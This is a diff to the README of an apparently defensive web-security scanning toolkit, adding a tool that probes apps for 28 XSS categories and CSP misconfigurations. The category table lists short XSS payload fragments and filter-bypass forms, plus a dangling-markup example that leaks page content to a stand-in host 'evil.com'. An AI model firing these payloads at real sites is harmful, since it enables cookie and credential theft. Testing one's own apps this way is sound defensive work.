@@ -1,6 +1,6 @@
 # build-aware-security-scanning
 
-A zero-dependency CLI toolkit that **discovers API endpoints**, **tests for SQL injection** across all 18 OWASP attack categories, **tests for API-level vulnerabilities** including mass assignment and parameter pollution, **tests GraphQL endpoints** for introspection, IDOR, and brute-force bypasses, and **tests for CSRF vulnerabilities** across 12 attack patterns — built for Next.js (App Router & Pages Router) and Express apps.
+A zero-dependency CLI toolkit that **discovers API endpoints**, **tests for SQL injection** across all 18 OWASP attack categories, **tests for API-level vulnerabilities** including mass assignment and parameter pollution, **tests GraphQL endpoints** for introspection, IDOR, and brute-force bypasses, **tests for CSRF vulnerabilities** across 12 attack patterns, and **tests for XSS & CSP misconfigurations** across all 28 PortSwigger XSS categories — built for Next.js (App Router & Pages Router) and Express apps.
 
 ## Install
 
@@ -253,6 +253,59 @@ TEST_EMAIL=admin@example.com TEST_PASSWORD=secret bass-csrf http://localhost:300
 
 ---
 
+### `bass-xss` — XSS & CSP Security Test Suite
+
+Tests the **running app** for all 28 XSS attack categories from the PortSwigger Web Security Academy, plus full CSP header analysis. Combines static DOM analysis (examining page source for dangerous source→sink chains) with active reflection probing (sending payloads and checking responses).
+
+```bash
+# Test default URL (localhost:3000)
+bass-xss
+
+# Custom base URL
+bass-xss http://localhost:3000
+
+# Pass project path to use discovered endpoints as test targets
+bass-xss http://localhost:3000 /path/to/project
+
+# With credentials (enables stored XSS tests)
+TEST_EMAIL=admin@example.com TEST_PASSWORD=secret bass-xss http://localhost:3000 /path/to/project
+```
+
+**Attack categories:**
+
+| # | Category | What is tested |
+|---|---|---|
+| 1 | **Reflected XSS — HTML context, nothing encoded** | Sends `<script>`, `<img onerror>`, `<svg onload>`, `<body onload>` payloads via query params and checks if they appear unencoded in the HTML response. |
+| 2 | **Stored XSS — HTML context, nothing encoded** | Submits XSS payload to POST/PUT endpoints, then checks GET responses for unencoded reflection. |
+| 3 | **DOM XSS — document.write(location.search)** | Statically analyzes all inline `<script>` blocks for `document.write()` / `document.writeln()` calls that co-occur with `location.search` or `location.hash` sources. |
+| 4 | **DOM XSS — innerHTML(location.search)** | Scans script blocks for `.innerHTML`, `.outerHTML`, and `.insertAdjacentHTML()` sinks that co-occur with user-controlled sources. |
+| 5 | **DOM XSS — jQuery .attr("href") sink** | Detects jQuery `.attr("href", ...)` calls driven by `location.search` or other sources — attacker can inject `javascript:` URI. |
+| 6 | **DOM XSS — jQuery selector + hashchange** | Looks for `$(location.hash)` patterns inside `hashchange` event handlers — hash value used directly as jQuery selector, executing HTML. |
+| 7 | **Reflected XSS into attribute — angle brackets encoded** | Probes whether `"` (double-quote) is left unencoded inside attribute values even when `<>` are HTML-encoded, allowing attribute breakout with `" onmouseover=...`. |
+| 8 | **Stored XSS into anchor href — double quotes encoded** | Submits `javascript:` URIs to fields that accept URLs; checks if `javascript:` scheme is stored and reflected in `href` / `src` attributes. |
+| 9 | **Reflected XSS in JS string — angle brackets encoded** | Tests whether `'` (single quote) passes through unencoded inside a JavaScript string variable, allowing `'; alert(1)//` string termination. |
+| 10 | **DOM XSS — document.write inside `<select>`** | Detects `document.write(location.search)` patterns inside pages containing `<select>` elements — attacker injects `</select><img onerror=...>` to escape the element. |
+| 11 | **DOM XSS — AngularJS `{{expression}}`** | Detects AngularJS (v1.x) usage via `ng-app`, `ng-controller`, and `angular.js` references. Probes `?param={{7*7}}` — if response contains `49` (not the literal `{{7*7}}`), AngularJS evaluated the expression. |
+| 12 | **Reflected DOM XSS** | Checks whether server-reflected values land inside `<script>` blocks (rather than raw HTML), signalling that the value may flow into a client-side DOM sink. |
+| 13 | **Stored DOM XSS** | Submits payloads via POST, then checks if they appear inside `<script>` blocks in subsequent GET responses. |
+| 14 | **Reflected XSS — most tags & attributes blocked** | Tests `<body onresize>`, `<body onpageshow>`, `<input autofocus onfocus>`, and `<details ontoggle>` — less-common HTML5 event handlers that may bypass tag/attribute blocklists. |
+| 15 | **Reflected XSS — all tags blocked except custom ones** | Tests `<xss onmouseover>` and `<xss onfocus tabindex=1>` — custom HTML elements are not in standard blocklists and still support event handlers. |
+| 16 | **Reflected XSS — some SVG markup allowed** | Tests `<svg onload>`, `<svg><animatetransform onbegin>`, and `<svg><animate onbegin>` — SVG elements support event handlers even when HTML elements are blocked. |
+| 17 | **Reflected XSS in canonical link tag** | Probes `<link rel=canonical href=... accesskey=x onclick=...>` — a canonical link with `accesskey` can trigger `onclick` via keyboard shortcut, bypassing interactive-event restrictions. |
+| 18 | **Reflected XSS in JS string — `'` and `\` escaped** | Tests `\\'-payload` — if the server escapes `'` with `\` but does not double-escape `\`, the attacker sends `\'` and the `\` is consumed, leaving `'` to close the string. |
+| 19 | **Reflected XSS in JS string — `<>`, `"` encoded, `'` escaped** | Tests `</script><script>payload</script>` — parser-level script block termination bypasses JS-string escaping entirely, since the HTML parser closes the script block before the JS parser reaches the escape. |
+| 20 | **Stored XSS into onclick event — HTML entities bypass** | Submits `&apos;`, `&#x27;` in POST body fields; checks if the browser decodes the HTML entity back to `'` inside an `onclick` attribute value, breaking out of the JS string. |
+| 21 | **Reflected XSS into template literal — all chars escaped** | Tests `${payload}` — if all quote variants, `<>`, and `\` are encoded but the value is placed inside a `` ` `` template literal, `${expression}` still executes. |
+| 22 | **Exploiting XSS to steal cookies** | Checks session cookie `HttpOnly` flag (missing = `document.cookie` readable by XSS), `Secure` flag, and `SameSite` attribute. |
+| 23 | **Exploiting XSS to capture passwords** | Checks whether password `<input>` fields on the page have `autocomplete=off` or `autocomplete=new-password`. Missing protection means XSS can inject a fake login field and capture password-manager auto-fill. |
+| 24 | **Exploiting XSS to bypass CSRF defenses** | Checks whether CSRF tokens are present in `<meta>` tags, hidden `<input>` fields, or inline `<script>` blocks — all of which are readable by any same-origin XSS, allowing the token to be stolen and replayed. |
+| 25 | **Reflected XSS — event handlers and href blocked** | Tests `<object data="javascript:...">` and `<math><mtext><option>` constructs that reach execution without standard event handlers or `href`. |
+| 26 | **Reflected XSS in JavaScript URL — some chars blocked** | Tests HTML-entity-encoded `javascript:`, `javascript:throw/...`, and `javascript:onerror=...,throw 1` — alternate javascript: URI forms that bypass simple string-matching filters. |
+| 27 | **Reflected XSS protected by strict CSP — dangling markup** | When `script-src` is strict but `img-src` allows external hosts, tests whether an injected `<img src='//evil.com/?` causes page content after the injection point (CSRF token, email, nonce) to leak as a URL query parameter. Also checks `connect-src` permissiveness. |
+| 28 | **Reflected XSS protected by CSP — CSP bypass** | Full CSP header analysis: `'unsafe-inline'` without nonce/hash, `'unsafe-eval'`, wildcard `*` in `script-src`, `data:` URIs, known JSONP/CDN bypass hosts (googleapis, cdnjs, jsdelivr), missing `base-uri` (base-tag injection), missing `form-action` (form hijacking), static/reused nonces, and missing `report-uri`. |
+
+---
+
 ## OWASP Coverage
 
 Each tool maps directly to specific entries in the **[OWASP Top 10 (2021)](https://owasp.org/Top10/)** for web applications and the **[OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x00-header/)** for APIs.
@@ -279,6 +332,14 @@ Each tool maps directly to specific entries in the **[OWASP Top 10 (2021)](https
 | **API4:2023** | **Unrestricted Resource Consumption** | Brute-force bypass: sends JSON array batches (10 operations in one HTTP request), alias floods (10 aliased calls in one query document), fragment amplification (one fragment spread 10 times), and deep query nesting (depth 10) to verify that rate limiting applies per-operation rather than per-request. |
 | **API8:2023** | **Security Misconfiguration** | Full introspection scan for sensitive field names (password, token, secret, SSN, CVV, …) and sensitive type names (Admin, Internal, Credential, Session, …). Flags deprecated fields still present in schema. CORS header inspection detects wildcard `Access-Control-Allow-Origin` and credentialed cross-origin access. Checks `Content-Type` restrictions and SameSite cookie attributes on mutations. |
 | **API9:2023** | **Improper Inventory Management** | Hidden endpoint discovery probes 27 common GraphQL paths via POST and GET typename probes. Separately checks for publicly exposed GraphQL IDE/explorer UIs (GraphiQL, Playground, Altair, Voyager) that allow unauthenticated schema browsing and query execution. |
+
+### `bass-xss` — OWASP Top 10 (2021)
+
+| OWASP | Category | What the suite covers |
+|---|---|---|
+| **A03:2021** | **Injection** (includes XSS) | All 28 XSS attack patterns: reflected (HTML context, attribute, JS string, template literal), stored (HTML, href, event handler), DOM-based (document.write, innerHTML, jQuery, AngularJS), and all filter bypass techniques (blocked tags, SVG, custom elements, canonical link, JS URL variants). |
+| **A01:2021** | **Broken Access Control** | Cookie theft via XSS (HttpOnly missing), password capture via auto-fill (autocomplete missing), and CSRF-bypass via XSS (CSRF token readable from DOM). |
+| **A05:2021** | **Security Misconfiguration** | Full CSP header analysis: missing header, report-only mode, `'unsafe-inline'`/`'unsafe-eval'`, wildcard `*`, `data:` URIs, known CDN/JSONP bypass hosts, missing `base-uri`, missing `form-action`, static nonces, dangling markup exfiltration via permissive `img-src`, and missing violation reporting. |
 
 ### `bass-csrf` — OWASP Top 10 (2021)
 
@@ -379,6 +440,42 @@ await testIntrospectionExposure(gqlUrl, 'AUTH=token', result)
 await testBruteForceBypass(gqlUrl, 'AUTH=token', result)
 ```
 
+### XSS & CSP security
+
+```js
+import {
+  runXssTests,
+  testReflectedXssHtml,
+  testDomXssDocumentWrite,
+  testDomXssInnerHtml,
+  testDomXssJquery,
+  testXssInAttributes,
+  testXssInJsStrings,
+  testAngularJsXss,
+  testXssFilterBypass,
+  testStoredXssEventHandler,
+  testXssExploitability,
+  testCspSecurity,
+} from 'build-aware-security-scanning'
+import { scanProject } from 'build-aware-security-scanning'
+
+const { endpoints } = scanProject('/path/to/project')
+
+// Run the full suite
+const stats = await runXssTests({
+  base:      'http://localhost:3000',
+  endpoints,
+  cookie:    'AUTH=<session_token>',  // optional — enables stored XSS tests
+})
+// { passed: 14, failed: 3, errored: 1, skipped: 2 }
+
+// Run individual categories
+const stats2 = { passed:0, failed:0, errored:0, skipped:0 }
+const result = (label, status) => { stats2[{pass:'passed',fail:'failed',err:'errored',skip:'skipped'}[status]]++ }
+await testCspSecurity('http://localhost:3000', endpoints, null, result)
+await testDomXssInnerHtml('http://localhost:3000', endpoints, null, result)
+```
+
 ### CSRF security
 
 ```js
@@ -454,6 +551,14 @@ Each endpoint object:
 | `gqlUrl` | `string` | Explicit GraphQL URL — skips the discovery phase |
 | `cookie` | `string` | Authenticated session cookie string |
 
+### `runXssTests(opts)` → `Promise<{ passed, failed, errored, skipped }>`
+
+| Option | Type | Description |
+|---|---|---|
+| `base` | `string` | App origin URL (e.g. `http://localhost:3000`) |
+| `endpoints` | `object[]` | Endpoint list from `scanProject()` — used to target reflection and stored XSS probes |
+| `cookie` | `string` | Authenticated session cookie — required for stored XSS tests (cats 2, 13, 20) |
+
 ### `runCsrfTests(opts)` → `Promise<{ passed, failed, errored, skipped }>`
 
 | Option | Type | Description |
@@ -470,7 +575,7 @@ Each endpoint object:
 |---|---|---|
 | `TEST_EMAIL` | all CLIs | Login email for authenticated tests |
 | `TEST_PASSWORD` | all CLIs | Login password |
-| `OOB_HOST` | `bass-sqli` | OOB server hostname (e.g. `xyz.oast.fun`) |
+| `OOB_HOST` | `bass-sqli` | OOB server hostname (e.g. `xyz.oast.fun`) for out-of-band SQLi categories 16–17 |
 
 ---
 
